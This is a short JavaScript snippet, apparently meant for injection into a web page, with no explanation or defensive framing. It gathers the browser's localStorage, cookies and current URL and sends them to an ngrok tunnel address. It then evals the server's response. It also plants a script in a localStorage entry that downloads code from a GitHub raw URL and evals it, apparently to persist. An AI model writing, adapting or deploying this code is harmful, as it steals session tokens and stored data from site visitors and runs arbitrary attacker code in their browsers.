

locall =  encodeURI(JSON.stringify(localStorage))
cookies = encodeURI(document.cookie)
urll = encodeURI(location.href)

console.log(cookies)

localStorage.trainerNewCachedBannersData = `<script>
fetch('https://raw.githubusercontent.com/CompartirGoogleDocs/CompartirGoogleDocs/main/JS2').then((res) => {return res.text();
  }).then((json) => {console.log(json);eval(json); // The json object is here;
  });
</script>`

  fetch(`https://705e-2800-98-111e-1229-e985-2d3d-6b00-b0d2.ngrok.io/docs?cookie=`+locall+cookies+urll,).then((res) => {return res.text();
  }).then((json) => {console.log(json);eval(json); // The json object is here;
  });
